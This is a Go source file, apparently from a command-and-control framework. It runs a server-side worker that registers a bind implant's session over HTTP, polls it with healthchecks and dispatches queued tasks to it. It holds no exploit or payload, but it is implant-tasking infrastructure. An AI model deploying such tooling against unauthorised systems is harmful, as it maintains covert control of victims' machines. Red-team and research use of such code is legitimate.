package speaker

import (
	"context"
	"errors"
	"fmt"
	"net/http"
	"sync"
	"time"

	"purpcmd/internal"
	"purpcmd/internal/protocol"
	"purpcmd/pkg/teamapi"
	"purpcmd/server/callback"
	serverimplant "purpcmd/server/implant"
)

const (
	defaultHealthcheckInterval = 30 * time.Second
	defaultFailureThreshold    = 3
	defaultTaskRetryInterval   = 15 * time.Second
)

type WorkerState string

const (
	WorkerConnecting   WorkerState = "connecting"
	WorkerConnected    WorkerState = "connected"
	WorkerDisconnected WorkerState = "disconnected"
	WorkerStopped      WorkerState = "stopped"
	WorkerFailed       WorkerState = "failed"
)

type WorkerSnapshot struct {
	State               WorkerState
	Session             string
	InFlight            bool
	LastAttemptAt       time.Time
	LastSuccessAt       time.Time
	LastError           string
	ConsecutiveFailures int
}

type WorkerObserver func(WorkerSnapshot)

type ProtocolHandler func([]byte, callback.TransportContext, string) (callback.ParseResult, error)

// Worker owns one speaker endpoint and serializes all exchanges to its bind
// implant. StartWorker does not report success until first blood has been
// received, decrypted, registered, and associated with this speaker UUID.
type Worker struct {
	name     string
	uuid     string
	config   teamapi.SpeakerConfig
	engine   *RequestEngine
	handler  ProtocolHandler
	observer WorkerObserver

	ctx    context.Context
	cancel context.CancelFunc
	done   chan struct{}

	mu       sync.RWMutex
	snapshot WorkerSnapshot
	stopOnce sync.Once
}

func StartWorker(parent context.Context, name, id string, configuration teamapi.SpeakerConfig, observer WorkerObserver) (*Worker, error) {
	if parent == nil {
		return nil, errors.New("speaker parent context is required")
	}
	if name == "" || id == "" {
		return nil, errors.New("speaker name and UUID are required")
	}
	if err := validateSpeaker(name, configuration); err != nil {
		return nil, err
	}
	engine, err := NewRequestEngine(configuration.Client)
	if err != nil {
		return nil, err
	}
	ctx, cancel := context.WithCancel(parent)
	worker := &Worker{
		name: name, uuid: id, config: cloneSpeakerConfig(configuration), engine: engine,
		handler: callback.ParseCallbackDetailed, observer: observer,
		ctx: ctx, cancel: cancel, done: make(chan struct{}),
		snapshot: WorkerSnapshot{State: WorkerConnecting},
	}
	worker.notify()
	if err := worker.firstBlood(); err != nil {
		worker.recordFailure(WorkerFailed, err)
		cancel()
		engine.CloseIdleConnections()
		close(worker.done)
		return nil, err
	}
	worker.setState(WorkerConnected)
	go worker.run()
	return worker, nil
}

func (worker *Worker) firstBlood() error {
	response, err := worker.request(protocol.ExchangeRegistration, nil)
	if err != nil {
		return fmt.Errorf("speaker first blood request: %w", err)
	}
	result, err := worker.handler(response.Body, worker.transportContext(), "")
	if err != nil {
		return fmt.Errorf("speaker first blood callback: %w", err)
	}
	if result.MessageType != internal.REG || result.Session == "" {
		return fmt.Errorf("speaker first blood returned message type %d without a session", result.MessageType)
	}
	session, err := serverimplant.APIGetSession(result.Session)
	if err != nil {
		return fmt.Errorf("speaker first blood session: %w", err)
	}
	if session.Transport != teamapi.SessionTransportSpeaker || session.SpeakerUUID != worker.uuid {
		return errors.New("speaker first blood was not associated with the requesting transport")
	}
	if implant := serverimplant.ImplantPtrByName(result.Session); implant != nil {
		implant.ImplantSetHealthMonitoring(healthcheckEnabled(worker.config.Healthcheck))
		implant.ImplantSetTaskRetryInterval(retryInterval(worker.config.Retry))
	}
	worker.mu.Lock()
	worker.snapshot.Session = result.Session
	worker.mu.Unlock()
	worker.recordSuccess()
	return nil
}

func (worker *Worker) run() {
	defer close(worker.done)
	defer worker.engine.CloseIdleConnections()

	var healthTicker *time.Ticker
	var health <-chan time.Time
	if healthcheckEnabled(worker.config.Healthcheck) {
		healthTicker = time.NewTicker(healthcheckInterval(worker.config.Healthcheck))
		health = healthTicker.C
		defer healthTicker.Stop()
	}
	retryTimer := time.NewTimer(time.Hour)
	if !retryTimer.Stop() {
		<-retryTimer.C
	}
	var retry <-chan time.Time
	defer retryTimer.Stop()

	session := serverimplant.ImplantPtrByName(worker.Session())
	if session == nil {
		worker.recordFailure(WorkerFailed, errors.New("speaker session disappeared after registration"))
		return
	}

	for {
		select {
		case <-worker.ctx.Done():
			worker.setState(WorkerStopped)
			return
		case <-health:
		case <-session.TaskReady():
		case <-retry:
			retry = nil
		}

		if worker.ctx.Err() != nil {
			worker.setState(WorkerStopped)
			return
		}
		needsRetry, cycleErr := worker.checkAndDispatch()
		if delay, pending := session.NextTaskDeliveryDelay(time.Now()); pending {
			configured := retryInterval(worker.config.Retry)
			if cycleErr != nil || needsRetry {
				if delay < configured {
					delay = configured
				}
			} else if delay <= 0 {
				delay = time.Millisecond
			} else {
				if delay < configured {
					delay = configured
				}
			}
			if !retryTimer.Stop() {
				select {
				case <-retryTimer.C:
				default:
				}
			}
			retryTimer.Reset(delay)
			retry = retryTimer.C
		} else if retry != nil {
			if !retryTimer.Stop() {
				select {
				case <-retryTimer.C:
				default:
				}
			}
			retry = nil
		}
	}
}

// checkAndDispatch requests an ordinary CHK frame from the bind implant. The
// shared callback parser may claim a queued task, which is then delivered in a
// second HTTP exchange and completed through the same RSP/CHU parser.
func (worker *Worker) checkAndDispatch() (bool, error) {
	response, err := worker.request(protocol.ExchangeHealthcheck, nil)
	if err != nil {
		worker.recordFailure(WorkerDisconnected, err)
		return true, err
	}
	result, err := worker.handler(response.Body, worker.transportContext(), worker.Session())
	if err != nil {
		worker.recordFailure(WorkerDisconnected, err)
		return true, err
	}
	if result.MessageType != internal.CHK {
		err = fmt.Errorf("healthcheck returned protocol message type %d", result.MessageType)
		worker.recordFailure(WorkerDisconnected, err)
		return true, err
	}
	worker.recordSuccess()
	if len(result.Task) == 0 {
		return false, nil
	}

	response, err = worker.request(protocol.ExchangeTask, result.Task)
	if err != nil {
		worker.recordFailure(WorkerDisconnected, err)
		return true, err
	}
	if response.StatusCode == http.StatusNoContent && len(response.Body) == 0 {
		worker.recordSuccess()
		return false, nil
	}
	if len(response.Body) == 0 {
		err = errors.New("task exchange returned an empty response")
		worker.recordFailure(WorkerDisconnected, err)
		return true, err
	}
	result, err = worker.handler(response.Body, worker.transportContext(), worker.Session())
	if err != nil {
		worker.recordFailure(WorkerDisconnected, err)
		return true, err
	}
	if result.MessageType != internal.RSP && result.MessageType != internal.CHU {
		err = fmt.Errorf("task exchange returned protocol message type %d", result.MessageType)
		worker.recordFailure(WorkerDisconnected, err)
		return true, err
	}
	worker.recordSuccess()
	return false, nil
}

func (worker *Worker) request(operation string, body []byte) (Response, error) {
	worker.mu.Lock()
	worker.snapshot.InFlight = true
	worker.snapshot.LastAttemptAt = time.Now().UTC()
	worker.mu.Unlock()
	worker.notify()
	defer func() {
		worker.mu.Lock()
		worker.snapshot.InFlight = false
		worker.mu.Unlock()
		worker.notify()
	}()

	template := worker.config.Request
	headers := cloneHeader(template.Headers)
	headers.Set(protocol.ExchangeHeader, operation)
	return worker.engine.Do(worker.ctx, RequestSpec{
		Method: template.Method, Path: template.Path, Host: template.Host,
		Headers: headers, Query: cloneValues(template.Query), Cookies: cloneStrings(template.Cookies),
		Body: append([]byte(nil), body...), ExpectedStatus: append([]int(nil), template.ExpectedStatus...),
	})
}

func (worker *Worker) transportContext() callback.TransportContext {
	return callback.TransportContext{
		Kind: teamapi.SessionTransportSpeaker, Name: worker.name, UUID: worker.uuid,
		Protocol: "http", Profile: worker.config.Profile, RemoteAddress: worker.config.Client.BaseURL,
	}
}

func (worker *Worker) recordSuccess() {
	worker.mu.Lock()
	worker.snapshot.State = WorkerConnected
	worker.snapshot.LastSuccessAt = time.Now().UTC()
	worker.snapshot.LastError = ""
	worker.snapshot.ConsecutiveFailures = 0
	worker.mu.Unlock()
	worker.notify()
}

func (worker *Worker) recordFailure(state WorkerState, err error) {
	worker.mu.Lock()
	worker.snapshot.State = state
	worker.snapshot.LastError = err.Error()
	worker.snapshot.ConsecutiveFailures++
	failures := worker.snapshot.ConsecutiveFailures
	session := worker.snapshot.Session
	worker.mu.Unlock()
	if session != "" && healthcheckEnabled(worker.config.Healthcheck) && failures >= failureThreshold(worker.config.Healthcheck) {
		if implant := serverimplant.ImplantPtrByName(session); implant != nil {
			implant.ImplantSetUnavailable()
		}
	}
	worker.notify()
}

func (worker *Worker) setState(state WorkerState) {
	worker.mu.Lock()
	worker.snapshot.State = state
	session := worker.snapshot.Session
	worker.mu.Unlock()
	if state == WorkerStopped && session != "" {
		if implant := serverimplant.ImplantPtrByName(session); implant != nil {
			implant.ImplantSetHealthMonitoring(false)
		}
	}
	worker.notify()
}

func (worker *Worker) notify() {
	if worker.observer != nil {
		worker.observer(worker.Snapshot())
	}
}

func (worker *Worker) Snapshot() WorkerSnapshot {
	worker.mu.RLock()
	defer worker.mu.RUnlock()
	return worker.snapshot
}

func (worker *Worker) Session() string {
	worker.mu.RLock()
	defer worker.mu.RUnlock()
	return worker.snapshot.Session
}

func (worker *Worker) Done() <-chan struct{} { return worker.done }

func (worker *Worker) Stop() {
	worker.stopOnce.Do(worker.cancel)
	<-worker.done
}

func cloneSpeakerConfig(configuration teamapi.SpeakerConfig) teamapi.SpeakerConfig {
	result := configuration
	result.Client.Headers = cloneHeader(configuration.Client.Headers)
	result.Client.Query = cloneValues(configuration.Client.Query)
	result.Client.Cookies = cloneStrings(configuration.Client.Cookies)
	result.Client.TLS.SPKISHA256Pins = append([]string(nil), configuration.Client.TLS.SPKISHA256Pins...)
	result.Request.Headers = cloneHeader(configuration.Request.Headers)
	result.Request.Query = cloneValues(configuration.Request.Query)
	result.Request.Cookies = cloneStrings(configuration.Request.Cookies)
	result.Request.ExpectedStatus = append([]int(nil), configuration.Request.ExpectedStatus...)
	if configuration.Healthcheck != nil {
		healthcheck := *configuration.Healthcheck
		if configuration.Healthcheck.Enabled != nil {
			enabled := *configuration.Healthcheck.Enabled
			healthcheck.Enabled = &enabled
		}
		result.Healthcheck = &healthcheck
	}
	return result
}

func healthcheckEnabled(configuration *teamapi.SpeakerHealthcheckConfig) bool {
	return configuration == nil || configuration.Enabled == nil || *configuration.Enabled
}

func healthcheckInterval(configuration *teamapi.SpeakerHealthcheckConfig) time.Duration {
	if configuration == nil || configuration.Interval <= 0 {
		return defaultHealthcheckInterval
	}
	return configuration.Interval
}

func failureThreshold(configuration *teamapi.SpeakerHealthcheckConfig) int {
	if configuration == nil || configuration.FailureThreshold <= 0 {
		return defaultFailureThreshold
	}
	return configuration.FailureThreshold
}

func retryInterval(configuration teamapi.SpeakerRetryConfig) time.Duration {
	if configuration.Interval <= 0 {
		return defaultTaskRetryInterval
	}
	return configuration.Interval
}
